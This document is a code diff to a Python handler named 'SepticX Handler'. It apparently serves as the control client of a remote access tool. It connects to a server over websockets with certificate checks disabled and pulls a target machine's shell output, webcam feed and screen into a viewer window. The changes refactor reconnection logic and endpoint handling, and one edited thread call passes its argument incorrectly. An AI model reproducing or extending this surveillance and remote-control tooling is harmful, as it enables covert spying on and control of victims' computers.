@@ -1,6 +1,5 @@
 import multiprocessing, threading, websocket, requests, pyaudio, base64, json, time, glob, cv2, ssl, os, io
 from websocket import create_connection
-from playsound import playsound
 from PIL import Image, ImageTk
 from random import randbytes
 from termcolor import cprint
@@ -135,6 +134,7 @@ class Main:
 
                 try:
                     print(ws.recv())
+                    timer.cancel()
                 except KeyboardInterrupt:
                     break
 
@@ -142,15 +142,14 @@ class Main:
                     ws = self.establishConnection()
 
                 except websocket._exceptions.WebSocketConnectionClosedException:
-                    pass
+                    ws = self.establishConnection()
+
 
                 if not timer.is_alive:
                     self.ws = self.establishConnection()
                     ws = self.ws
                     print("[SepticX Handler]: Timeour Error Occured")
                     
-                else:
-                    timer.cancel()
 
         def establishConnection(self):
             ws = create_connection(f'wss://{self.host}/api/ws/readShell', sslopt={"cert_reqs": ssl.CERT_NONE})
@@ -208,7 +207,7 @@ class Main:
             self.ws = self.establishConnection()
             self.display(option)
 
-        def update(self, panel, endpoint):
+        def update(self, panel):
             start_time = time.time()
             ws = self.ws
 
@@ -228,7 +227,7 @@ class Main:
 
                 except Exception as e:
                     print(e)
-                    ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}", sslopt={"cert_reqs": ssl.CERT_NONE})
+                    ws = create_connection(f"wss://{self.host}/api/ws/{self.endpoint}", sslopt={"cert_reqs": ssl.CERT_NONE})
                     ws.send(self.key)
                     ws.send(target)
 
@@ -239,11 +238,11 @@ class Main:
             window.configure(background='grey')
             
             if not option:
-                endpoint = "showCamera"
+                self.endpoint = "showCamera"
             else:
-                endpoint = "showScreen"
+                self.endpoint = "showScreen"
 
-            ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
+            ws = create_connection(f"wss://{self.host}/api/ws/{self.endpoint}")
             ws.send(self.key)
             ws.send(self.target)
 
@@ -256,11 +255,11 @@ class Main:
             panel = tk.Label(window, image=img)
             panel.pack(side="bottom", fill="both", expand="yes")
 
-            threading.Thread(target=self.update, args=(panel, endpoint)).start()
+            threading.Thread(target=self.update, args=(panel)).start()
             window.mainloop()
 
         def establishConnection(self):
-            ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
+            ws = create_connection(f"wss://{self.host}/api/ws/{self.endpoint}")
             ws.send(self.key)
             ws.send(self.target)
             return ws
